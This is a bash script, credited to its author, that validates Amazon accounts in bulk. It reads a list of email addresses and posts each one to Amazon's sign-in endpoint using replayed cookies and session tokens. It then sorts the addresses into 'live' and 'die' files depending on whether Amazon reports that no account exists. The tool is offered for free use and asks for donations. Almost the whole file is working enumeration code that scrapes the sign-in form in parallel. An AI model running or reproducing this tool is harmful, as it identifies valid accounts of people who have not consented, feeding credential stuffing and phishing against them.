#!/bin/bash
#Coded By AchonkJust - Demeter16
GREEN='\e[38;5;82m'
CYAN='\e[38;5;39m'
RED='\e[38;5;196m'
YELLOW='\e[93m'
PING='\e[38;5;198m'
BLUE='\033[0;34m'
NC='\033[0m'
BLINK='\e[5m'
HIDDEN='\e[8m'
header(){
printf "${PING}"
printf "Donate & Support: ${CYAN}wa.me/62895340454593 ${GREEN}|| ${YELLOW}facebook: https://web.facebook.com/aksiteruzzzzzz\n"
printf "${GREEN}For More Tools FREE\n${PING}"
printf "     ___        __                _____ _____ _____   _       ________    \n"
printf "    /   | _____/ /_  ____  ____  / ___// ___// ___/  (_)_  __/ ____/ /_   \n"
printf "   / /| |/ ___/ __ \/ __ \/ __ \/ __ \/ __ \/ __ \  / / / / /___ \/ __/   \n"
printf "  / ___ / /__/ / / / /_/ / / / / /_/ / /_/ / /_/ / / / /_/ /___/ / /_     \n"
printf " /_/  |_\___/_/ /_/\____/_/ /_/\____/\____/\____/_/ /\__,_/_____/\__/     \n"
printf "                                               /___/					  \n"
read -p "			Your Email List: " list
read -p "		Result Saved To Folder : " saved
printf "========${YELLOW}Started at: ${GREEN}$(date +%R) ${YELLOW}|| Amazon Validator Email=====\n"
sleep 2
if [[ ! -d "$saved" ]]; then
	mkdir $saved
fi
}
function gas(){
	cek=$(curl 'https://www.amazon.com/ap/signin' -s \
	-H  'authority: www.amazon.com' \
	-H  'cache-control: max-age=0' \
	-H  'origin: https://www.amazon.com' \
	-H  'upgrade-insecure-requests: 1' \
	-H  'dnt: 1' \
	-H  'content-type: application/x-www-form-urlencoded' \
	-H  'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36' \
	-H  'sec-fetch-user: ?1' \
	-H  'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' \
	-H  'sec-fetch-site: same-origin' \
	-H  'sec-fetch-mode: navigate' \
	-H  'referer: https://www.amazon.com/ap/signin?_encoding=UTF8&ignoreAuthState=1&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_signin&switch_account=' \
	-H  'accept-encoding: gzip, deflate, br' \
	-H  'accept-language: en-US,en;q=0.9,id;q=0.8' \
	-H  'cookie: session-id=139-2164591-0956364; ubid-main=130-9221217-9580142; skin=noskin; session-id-time=2082787201l; i18n-prefs=USD; sp-cdn="L5Z9:ID"; x-wl-uid=1Ie5fQoI60nt6cwGbCQNak1qBefvQaOQYQicbntpiPHkgJNZShPCFj8KjPiF7UR1n3Y9ef6blomI=; session-token=mvIZJtg4+lBZYOHpr0UZcgInlyprnb8ilaijx+JuYNpLTroZTzYbHNbz/9N5N2mrUo4Zj3aG2ql5ET9kEShodp72JUrHVdOvSEOZFNomlJmb9LNR/lGV7IfXuydsyKkaIdSq953T/3s0CjPgkYZBTBfLu2r49Xd5VGQSYuLhHzK7/MCxqp1kJmKHXFW0oelgvK4vX4ngF03Gq4AZN5KoAxoUixvWsKgY; csm-H it=adb:adblk_no&t:1574006773636&tb:HCS001D3PTZWSD1G8KEC+s-EQ9B8CKQ7TN844E1DX1R|1574006773636' \
	--data 'appActionToken=j2Fq3Lbuoo2cLQVUCbyfMCKV2BRBEj3D&appAction=SIGNIN_PWD_COLLECT&openid.return_to=ape%3AaHR0cHM6Ly93d3cuYW1hem9uLmNvbS8%2FcmVmXz1uYXZfc2lnbmlu&prevRID=ape%3ARVE5QjhDS1E3VE44NDRFMURYMVI%3D&workflowState=eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.Gk93OXrqiGDBDRp9InF8M4Fqb0LP2ZgcyJVSCexRRL3Nj0VHdTaBfw.BLv_7IcLMgwBVR0r.fh1yNqikTwioGyNWs3a_Tn6q6f0VnrsoujhlBH3AhNSdjr7HZ5eunl7Qy4pz4d0wRhsqpdN4iA1gK6isyv1r_NPWuOukQ59E27GzGLQEJoOOT8BcVr7tthR3-vDudzS5qy-v5w9W_iolpmnXPsEiA5llvhbweIihWIYK5s3OyNRsfxf-doTBw2t-xPWmiDJXH1nw3aKXhCltGgE0mjRQlGSFxQGGBq11G2znjZ8j-RczHKsF8L9dfwYyG6n-TdgIl8ZxO8OIkFPV0b8mxW3zKvn4aWFbk8Iu3W5HX_GdEQYax8D5AgEAWf1PseIyFeuQ8w5u_mEFSD5APrH3g2_of41BucW7vB6R7sG32vvZeEnEOI_l.oAJmVWeiO7Nm5-va89KRcQ&email='$1'&password=&create=0&metadata1=ECdITeCs%3AJrHyhvcbu9Ysp1J3yltbXw%2BPtBnKpZ1h0rE5PWDagmqqUW04L6%2F050MZ1ZS%2Bd2zbA8eEUSj44Hi%2BSflQ5byGXhIqWtn%2BKXYmKK3nzVAU4Iu0c0IfQMf1eyrgW1SJSN9e%2FPOit25syUC5LdtB%2FuCvf716LBHS18coFB%2B0kHlPr8eFTADLc5RdF6n0cAIyr6jx3K4E8xYfs6Q8o86UJ48cag8wU%2BMQIlBcONv8rTLryswsjzh0lhMlhh81%2FQtapJEJ7DjISolGGZxq%2BfIbRmpHJVPCOEA%2BieRA0U3IyESDfzxGvBpSFD3xGFDfu9ijHJekJeYqid4knBHgDeRoHx6MTb2evQGnvIRu9FpLFyJHcED2at805vgwskdFYlzCsJ%2B%2BCEthyg6tKgfzaUFYWi7hewmAoMbUtpIadUZJyLZJmPQXvLsY4pXHQ4d3BcjmHKAG0x%2FmgxRF%2B5AfxmecX5XnoB8MDpVHKZiT1J6EmuUmTxUfUcR0QFmlzCeAuHyjCDT68YkHLG6DyG5sm0d54fjMAw4EslUsZuQbClwG0y1ygeLFBmkOZw0OWKF10L5o3QBTRF6WqNOMGsjeiAde3L3lMxAsAacbkfpR%2Fx5IYN1okUpJAD2raqi8RRiZ4Sh9SeMrqghmjQqoU4JUKMhTzqc6HJ%2Fe%2BjNyjti6ETF3vdlmIkDBPZwOfMvup5l4a8S1DDBQXyzpRxqhIl%2B%2FWXVMQGA2CdkcfYvE4BGxjdgrm5xxjM6A1uc4CZsrp725NwM%2BRVeZOpzSsIPRzLhEiH2Qy7ayHjnYAKTax3WTjkywbi2TgwMu5T38hHPrIzDxKyUfrE9D3QTlEJlAGb%2BE0Rd2FH50ujI5PBHCcEgPgWgHPTC0p1WMITPGTDeZBVJdI4Nh5OiQ6k0VCK7j3JCgBesIlUFPCKIeCNoNRGV1fF18WydltSVQc92qLw%2FDSu%2BHd08wgQJyemEWlXae97O%2BVj%2F68sSXZkOVHOQWjh0nRTQ5BAvHI4eLL5gnHydVt5WwpIiiJTLFn7r5kvniq56pr47RUdcQYewgCLsZirgnJbkl0RC2yAvefPTp9R%2B43z%2BQtoviE87SDPti0cS3iMLktComvCU%2BDr3a%2BbhVyqjUBHEApaGadBuOcVkaspTCrrgoXeHdPKhGFMMZSbd%2BfEdGR6T8yo80WaPL%2BpNay4%2B2SbydvKvaxUKN48EU8RA1cSKv4Z3erurZtjrCzYF%2B9QG7qd5O4bFLZ2Eu6%2Bf5IqTiA8ftMX15b04LNMQ1TphK88L%2BNtPeL6%2FUDWnSQznnPHIzhmokwftIviowL2yMbVF3nN31k4gCwIeqc%2BtsAbaZLUncOUG%2BQOsjCvJglr6e2tOucEiUdOhbtAmtRMof8iwnecWCJez%2BTjs7UctLLgIYAkSIeFi35Yla1MxRqN6ZB0keYt3w81M2pZ8w67LnU9EGLWGsGK62%2FiI8bXPRSCPMmZ4GAG6GBnFSpu81GQajkZ9rXZftNRVwy8ukb7jY4u7Mgv%2BqAY2mDaAfIgOuAAxMVL0amE6A4IJvW1H0Ejf5Mp7hdy2x7zwSvlmB2y5CislAyj6TcttEzbxLrvhyHKrzFRTlThfkU%2F%2Biua3sD2uID%2Bw7LIqG8Y6LR54EPiy%2FLCUmv8YoCBcZtpnBIGes9UhPdqF26UYzHkzCykeNUh0NFiwxP9uxP3MPyD%2FQxIHmpuxS7EGCMgYNAj9%2FZA9UZlUG43Z0dC35xyibzMrKsFh5PJyqGzWT32bmYkKYp3T%2FhRihxkrjhzvBMVljJI9iC6UjV%2Bk1NGkK%2Fo%2F4dpohCJ0B%2FCP%2FSOHqUh6Rr0q8iqmvug3WbKP9S4kMbo4k%2BaZeIzdrrYjUcFCGaVWWcUJVlYFg7Jxiw1mYv0lsgXzK7%2BkacTXmFUrL4wFwFT5cNb8V%2FcIByW9FKdwmizLhi%2BqJZNAM2V8CnlFdPnwPCeyEUa8ZIJ7C%2FCSPvCuzg2ZU6g%2BLtm%2FkUmWwuarlQ7t0BMGmcQ5yMXe6J9EriyIUoUXdqT6r5i3nKMH6gZOPY3llTpd2C7QztmpxwwhVgd9rpOIPSyx0jh1lm53sS0Y2KSZzGrR6ij%2BPZOxnF6G%2FE0EOph3BWC0LSXNGzSQSGZGca9KUPbHHa3gZAq%2Fjubhxb%2FmqMN0B9FMyrK17kg%2FbcFTQqGAgnX2iFcNg0e%2Bbm4giSbhQRPjhsrq7zrMWEfF6o%2BVxT1%2FkUfklZEEsbCg%2BlKnXpVhqb70fhrQ%2BbwU0SS5FbNpDWqZmBhH4VU5EMHFnZ4XdKn2JhL5CNNEDlhbfx4BIpzz5H%2FYkJwUaiMwiqiGGKanaeCs44yNpbMlbCfz1T4pvGK1LYxWxE2DnasaX0W2lFAD9rxxSgW%2BgTsfCcS6Qa6lQ2FhKuB1k9zmxbkyxkbGVouAGgL962Yjdlm5sM4xzKwUpWsjTW2KTHvJUwoi2h7JArp5cGvi0Z9NeYbiVpSrNHi4XQphwdILf29U7Cd4J8aBhc192cr7qLP0Yv%2BYVR8YLKGLouZCHAtbuI8DbUpsOGhfNZ4uPPMHdP5H0g%2FXowqHMVVcAapoRf4JXhgmIX3cV2G4JoZ9e0af5Jl6WOxZAj3Qx%2B1bm8pTCg7Eqh5MeFdcYjm6SbP%2FAEGd6PsrZoNZR1cvGrvV86DnjwsCygy7JsVIR5%2BuWvC1IJFucs47%2B1F2xIbDUJjk5NapFFXFtfwwiiI35%2BV%2BO3GRTabe96Zvb1RlA%2Fd%2FywMNYkoL%2BV18%2BE9NP8mejNsh1sa0nAKSFnZRk%2FC82x%2FIRjvVa00pNQgBBzwSXImcXHu%2Fe8WDvYFgkjsLmY4Un6RagqgTjcTebmcxIXDZx37vjKFAOve3ZREcKue5f3AxVCAg%2FRm2JbHHEuVHo%2BAr4xdJih9dIyWSrkk95Ul9jzxlqLuZbSmT507vlhbZb%2BLqo29T8Zttrv1K3gPu6jL%2FkqxjmvjasSVdTmuO8ti%2F7cHX%2FE8mKetZ4b0RbdYlHg3rTpkuxltGbtIuMkkhJbp7L%2Fmxnese7LE3hk8Yx1KFvh%2BUg9d2I8m24uviNTCANInYK9tqVS6WnXOm9t0DymOaQ%2B4bfZhkmQUEaGYUqi7Ve7NL1rYpb%2F%2FWNvtz17uxdfJB6%2Bc33y7VpXkJC%2BLQTpZGE3RUuXJKfp3FPK6005SvrjQgDm1PBw8NnlqvYnXqcbXgkyxaEci%2BsPWacregDtwebmKT%2B7KV0wMU7IHSn%2FawI4ZLjFJtKNiAXDYy1vbeXVYQ00kM4nYf68hg%2Bf7I4zwglxVNnhcBIRX%2BlSZG7JknOyQONDxTfpoHpAAL3J48koRey66C0UUgC2w%2B2pM5We1nATMI83pQUftWxNnBNa5sTmkWIxmqKSdXaI0Z%2BXMfG3ePMgCNMtwNv0F53whsmpgVTRC%2Fu3qxfiOrkobDhp0czcEyTO7ijgS7zN54RZhokNII9Sc0P82xZmc%2BKLvYosJo5gK0NkU5fQGP6xyYpvqZTWgkwHs6EUDF9WDANTairehGp%2BP%2FVA5%2BiP2ghQYUiTSyeYRTpit92NOjqNvyHDx5QScH1hyQmRYEAWES29QCjeXir2aQZJhdkR%2FKRtFxvPqfUlIIvJ0pqgz9I6W7L5tTUPwkG%2BVwGnLSp5I%2BbV76ZbpyEog5fsqhIp9KRU%2BUWcsl92mxpJWWYyPvj6Kmo6yrYQHLlNTvIya7sTG7cB0Rfu2j5QaT%2FGEaVcpp9SyNaccSzvb0r4HHENy8VI8lF2mu558kVBDN316%2BIpwBTg8z0bnXfA6Z2XtYWsoTOCIMOJ8%2FN2QMrvv5mL%2FtrcK9JfWYT0V1ywNWiRT0%2F%2FwNl0Dcp%2FZakAYWQr9AtMiK3CYVZGXYZxgEdu4TgcQ%2Fw%2Fz5y4ZKgdcejuAPw8SoOjgux5buQ5Ssmz4fEH5cBxwaKPhPqsMKFR4nR%2BAMqZ6uJfL8Ex5cYqlPHvjD1RiyLWWIxkqyT0ut%2FTfDC4uRJgjPrQ88mLYsFRqDqeebJzCFYJkS1T5BuTS7FF24uaPtyz19MDW0XEOrvLm6elsx4X7h8YDZoZekfJ6y2wXeA2ySmFw3xkF2kpMLd8krh%2FFCWXQpuk%2F%2B6krs%2BE7B%2BWKbQtmk8c%2Bl0DcUO5Ts7gev%2BRi%2B%2BsF0JhJ8QWI23HmpdoFZCTxkY1BW9kBkSGYeH6D02PUTWEM20q9%2Fovz7GA9drLuOOx55LmVdQkdgUNRCy8n%2FgJc9SfrKfgJYxsYzLPRFz2B27Uxam3O65FJYNP5nZ7YeKlNoS4Ig47RbYnI2rPY0ybjAJFLUfz1JnaL8IWU7zj4V4HdJvR7F1Aqna7GZ%2BlEH6ufTnJH9X7uRtQ55QOkR0hT4LlXk27lr972P63UWrR1LmPIBd%2Fqf3931W9sPPENZKdPPvJuKGU8Lma7iVwKVLeiz8rgvzj9Zg68cON89OZt1gzctjbj5lG3FcZ%2BK2QbeL30lHkYV2MJ7lkJq4sP1D2mZVxLrnfYJt6XmxM5ol0NwwXC6YLu5QNB2Mfi2eRlPkx6nWJ80R%2B%2BfT8sc2ss5KC6q5p%2B%2FMCMRU4HLGW9Yoc4Wmj1%2BuIp%2BHd5cff6caNh8lKK70eGMqDGjSE8nk%2F34OmkgtygFBxlytSTYMzDOUemFFm7PUGTCrQDdONZxI8GO3jKHAfMxFaefixL1gnJr0NsXwvNqonI8NWC6OKl2ctCBRzwFTx3nqnGGK7kX5VZUBJO54olg%2FF68yJyK0QgXanPI5mkBegr5VKEfjbyAw5fVmqvirkE0i3xJRERbVfJrqtL2Y5QTXqOZLgKCoPtL7jy4k4u5OwQtafi052IcjyMXx0bPxwVvFzz1Q9XRkXl2UkLPwYPMnw%2FosmdE7Ps5JIA2DVq90yVhWigOYpkut6C3e%2Fu10qWy43qCjEv%2BBUHqte46hvr4KBfd7VK3zgfjqTf2mPrzWNuLq2KkfyXWCgRJqzI1emcepDUAuFxvL0YQJ%2BgaEMPfSn3xbTmuLZt%2FwLUWsBa4tGB70ePASbDc%2B%2FiWNb29GF3TtlIIDXjrYR%2FqpwW3bJQyvUygbCRuSzT0ac785A7Q7vfDMJbWiik2GqrY7Mo0PdZwUcO9tR8rEu8HDsx2DVy1OBvpQQTTc2mPOVbVI8qcddMEYXJdCeD1CgXxfkouTbyWne%2BmJXT5%2FT%2F6N6EGMrF4t41uzTXOhyA6SlAPdvJaDyQkebHhhyZ7w%2B4%2Fts9vPKcnna%2Fi01e%2BXv5tubfbt8V5Qn1CeuyBc4xUxD9IhAWqjlEN69RmgtvvkbnRqsfr3GloQpMOnu5%2FUNWkcOpE%2FsaAcqLW%2F3S%2FXTc6I45jw1zBb8MVn0w6cgp%2BCED6vRTsviIwFn5szf7fbrY1UMUFfiZ6TYWJHMS%2F%2FN9GqpDL%2FFdLF6MHYpLO1jgrS%2F5BNyIuUJ9GvgXOtM1vm3DcPdBUaKHBJba9hlGpbHrokewQYHcgK2tZR4iQEtspgwRnWRCaYmZ1qWDznwma3ml4VM1sBTTLM5iHnwbJvaK6KvmqL50qdyPDnPS7675fXaAc7NOBg4f9IMPqEnGci3CzpkL0LJfZR0t0%2FMs4TNG05YtUuo0baZdrgsJtchaFPP0prLwOz%2Fy%2FXm8s1EejdW0NSRYBOa56%2FIzYbhhzQD2jyLoBAw77CwBHCbX0SBahSEb8aOedXNZRYyud8qg1lkt4wHEnRVbkEMD81IkYcAU7n0TmlaFGDd0sWArAOdduS%2F1H8JxKNML%2BT7O3d7Em4EJ3PUw1TUsSmLe2PTvpYzU7xotozymd8tEfezfZpM19LX%2BuVTuIdLb4HH1QnFmmLqJnr2BmiOLzL8mp0xvwfJ5tCtbIG9ZQ%2F89UrJnaa7IPRZilmc3TTzB0nR4O%2FYxvYmGx1FI9%2FIADQqUnyi6iQfB2MSkba0JXP7A0LBrQSX5vmpw%2Bpmn2ny%2F3u4DLVdfR9ErzrbfsjhzgIpbThDAvD5cmzV6zuuAmPEP6TT281xzVBYcb24JCE5Ua8NMU3NpCDR7hKSDPO7wYvsG46E7dHNkTtDEhFfC8ALr0U2jFGGKABkxRBRKasIamSzSX7RhcLT2NJIbogzRMlnATcAfEjTTzfFRjLY%2Fwyid78bAgjGuxpcyGW88nLibKsW8tq5mM3yKMFjqrekiWx0pg3lTnsHawPwfZ%2Fnq2eQAkfi3T91aSPO2Be7d7OdXFpbV3PSnwJrueWI0HTiQwPQP83tFQEWqzZRQQRuWmF5G%2FrlcXcrBhETa%2BGSOfxiK%2Btw%2FmR669BSx64muD4zjWwoPW7UWlc1TLKVavZSzIqc5r9xuth5SUJNP0rcJT6aE9FzFAP8lt1PWLAKMrWYDbc6dGTw8Pe0iXQ28zidYOHYSMpnYpp1WSzDqR%2BoaAALxZ9UE8DmAHPoBj5m8znt1VTzOazNi%2FrBVl9hz1HrWGTr6BS%2BsE3JPJuyvAVTSFeCKu%2BUjK%2FhG0cJb3iDIf51DkssJQbMkuKWuly0DCsOLHVS4CeYGN8zpl494%2BGCroiBY12OgHop2%2BghYNtALJNBUbOEy9FN49nMhadfnwyUQEgLt9cgvIkLq5d%2FTLgxFQogApIHREoQnNEA79lzlwGBus4oVVo%2BAMG0DPgQrrJRENfuN0Yb5OPgpyV6%2FQZei6qt33XxSx1QRjmhJXRFlQmXVOgxApfIDIAmA86GVG96r5Q9f2ACTONMXU5y83Yl%2FVl%2BvV4J9XckUGGKwFrAdoNORD2yiYMG8fJFQzxscOrV8Sx24RXZuLkyDwu02Qj1E0JqabHa%2FB%2FcmipnWSm66Vg01eetIAOp000XdiKtp%2ByzAaRs94aaQCqojxm688bY5FLEYCTWTyy%2F0b%2FEmKPTb7Q4jjQ0BgAHvrC16%2FR8YOBq0roB8gMRn%2B%2BeGIutjXVHAa97nK%2BQp2hDt4gYHYDVHZqRcd%2ByW0kKY4q8BOivg0mY770BzUjaVQOGCAnBq89pF7r5YxUCKHiyaQakzlKRZYg0H%2Bjcy0r8ZwI278NvvSfAKu4iQw4cN4KUCO%2FyyDKBKiEVVY6ecTQ5HPTzCKJuCEQjSqj9WsY2jRD%2FLUARJf35kqin36FPLe78AgVvMo47HTvbHP8qWdjxmTxlI2PD9FpfWzBs3cDmpkVhyOO9x1fD5ErDMfo3WaaMk4KBIzDNPeoayB6fWUOpeYM23BhnwPjmzagJEfc72HYwwT59grsCIJuyvSliwdQ9yH4S5DiPjKhA5NWHA%2F7s4ehCNotRDLbenMo%2BDAv6qujDckcanW%2B2ZFxNlEH1P3tynew59%2Fwvmrwg8SaMiQV%2BjcvuChzo%2BIBZ9nxZjS3ucGpNn8g7g1%2FYmscjqhWLAEPiLCSJQ6nLoelLakRtyNHd%2BRJjV6DyuZzvTaAiysDFuLlHgdNjEO2uLuK7Q3xFbYD%2FvF89mnH%2FpXZ%2FOpv0hTteEH6lLzjonmNvk3PNUYnbfWyBzbQ1tK%2BytiFgYeh4ShsbY7AAvkaiEYTEdkWlOFTpK1nhDOBRzBaEaNPDh4N5vNZSoUkvvffwRKsIaspv7j4CuisW1xw2bWNdmrj9T4%2F7X%2BeiKqkWiTlh2tmbxm4f6Oj3%2FrExIe3ejefjDPLBPzW%2FTsUFYh4cVmAXdV6UMi8MnE5QNS9lBCyzb7UAChzPjr0uNYpxaG4qx%2B%2FCB0T9v7hYb7lAWLLOjNFutU6zmrXoaplTvKpgK%2F%2Bz%2BlYQ1s48G5WzgwIwypCditYAVbrbqEhlVEILFagcxMzBNgyMTKWuQ1oW%2BkRYeZFcdr%2FLr8N5rYwhUSlTtPLKCTRhvIJvp0ao6kucQV0PnUtFIqPdRAE9YtkDHksss24KOl3rd4ESYh%2BdxqvFizHhWCim3WcYOEIeNZ5X0xNHC0AuPAogizecdH4rfA1fE0WxEyDJgPiLUexBbkM3XYTLltUsK5KaI%2FyHzexGqo8q5T9TOcpVmWWHXr%2FM9%2B%2FznRs1jAxe%2B%2FxJvI7IPBtIOFsl%2F6kaFZZkkOLDmqlF8fjzksVfVe7wPnzHOK6qhFjmg2S2UMLTgIelFZDaC7X7LIGfU4EUxouT%2BO4lDKpq24j9HTMEUcfD%2FwQ4OEBDQy2vJRtdAcBDzcciMMxldHXwb94BtPtxygAopOAHYjI3hCJuznqTTCwYCIwEXTQipCF6xXrF1M4FdR1GgpKxkiyxpK2Mp0%2BCkARpq7J3U%2FkeFOOH2i5UMX5gQcGElfIB%2BBnmlrETnIDOZEikfdgm%2BGRe7AY6Oq4J8UG0GRKHZxHRT2YLVLAiJPbRDRY6jEtEyrzi%2B5%2Brj9uC86KwMm7qeJqT1gp6uZvytenejzRroeno5hSoAxspf3C3MG7tNb%2FZMMAajwRslLjIThL0weVROtJQhBh42trVWP3IbHCjWVGwaak6OoQo3sOH8q49%2Bwc%2FCP9J7UEKQxTizozUuTDYc8REXScndVdkZn%2B96b0YBGULgvTpbKRoa6w8pGcS8p1KtNZv7E%2BHbo75Bmrg1euiPAveCdEUu8T7DyIyRKHjMIETScg7YAQL%2BWSZPDheJMfEXf93faqlF09xcw5oPgJU3%2FxCzbgtGbY%2Fup3i%2F0Dcr9U9rUxUS6ALKcg%2FifYki%2B3UnZbzK4yN%2FufYICYlWiassQz0qBdXpOy%2FoTo738jQl5mv1P%2BnXJPj9uyxroOOEP7gOkqjvjql%2F9Uii13ba%2FALHK%2FRw1U3CfW5rLfJjh3Rl7VBzO%2BezZTDkes0gWatZw0SG30MFmczyV6E%2Bm6R%2FPizVA8wswIsx9C7p0w8Nu0GiOU3tsUesxHcQtriEfAuBbl9wHkjtCndm8fDUCgJJpgBxa%2F8WjqXJ8iiDuVehDp6Eq31y8uwSNFaJZKqxPKDZTgWMeknbzuwcOs%2B5ZX65g4wimsX5k46Pt6ZUvA6nTC%2Bo3WpI1Fp5WRNbXbW5uww8OWmmi%2FmQEaYf9CXFAgcJvD9a7%2FBYmFEMv0kolr%2BuIkBOEVk7XI3RdwpDq0X3rd3Z%2BWm04RX71js6zzXDdye3gIPGkMcrUYPNaVR%2B9NMtdKnlx8tTt%2Bo9bFkE0qKD9iDWoa5NyzhH10tLtHLyV7%2FdvqxtsLAn2l4a5sFcuih%2BDlZ13poj5%2BWGdNekUQR4Z%2FS%2FcdzqyURuCpji05tIy%2F32nHwau7iRfnmgwN%2Fgd54xtCAXfozrsbOL%2BEWWh%2Fhd10vOhvXFjUTboAqgnqPbL0BUNjKL61LzoOpoooUlAVxZ89rku6KEmGqBDyJ4Vg3DYPW7pHLoBDWtw4aAtrqe8Exji9qPSjSBFkU%2BnPfl4zO%2BX%2FbaxwlfowseLCzWaAv%2BWbuUcQwWb5OsfyYvllOjOKk07HJ5cOgp%2BrLB2hxdM3b9NQG2FnAokKi7T9hBss1thOd9EzsQcYAvdKZjiI07kPhDoZHzlF733f1vue7luW8kv8KB5fFkq8OE6P1c5xtxAPMVhU0d1tR3wQm8YXkc%2B%2BALL3BIIXzX2pezA%3D' --compressed | grep -i 'We cannot find an account with that email address')
	if [[ "$cek" =~ 'We cannot find an account with that email address' ]]; then
		echo -e "${GREEN}[${YELLOW}${w}/$(cat $list | wc -l)${GREEN}] ${RED}$1${NC}"
		echo "${1}" >> ${saved}/die.txt
	else
		echo -e "${GREEN}[${YELLOW}${w}/$(cat $list | wc -l)${GREEN}] ${CYAN}$1${NC}"
		echo "${1}" >> ${saved}/live.txt
	fi
}
header
y=$(cat $list)
IFS=$'\r\n' GLOBIGNORE='*' command eval  'email=($y)'
for ((i=0;i<"${#email[@]}";i++)); do
	w=$(expr $i + 1)
	user="${email[$i]}"
	gas $user &
	tahan=$(expr $i % 100)
	if [[ "$tahan" == 0 ]]; then
		sleep 1
	fi
done
wait
cd $saved
wait
cat live.txt | sort -fsu > e; mv e live.txt
cat die.txt  | sort -fsu > e; mv e die.txt
cd ..
live=$(cat ${saved}/live.txt | wc -l)
die=$(cat ${saved}/die.txt | wc -l)
echo -e "${YELLOW}=======================You Have ${CYAN}$live Live & ${RED}$die Die || ${YELLOW}Ended at: ${GREEN}$(date +%R)${YELLOW}=======================${NC}"
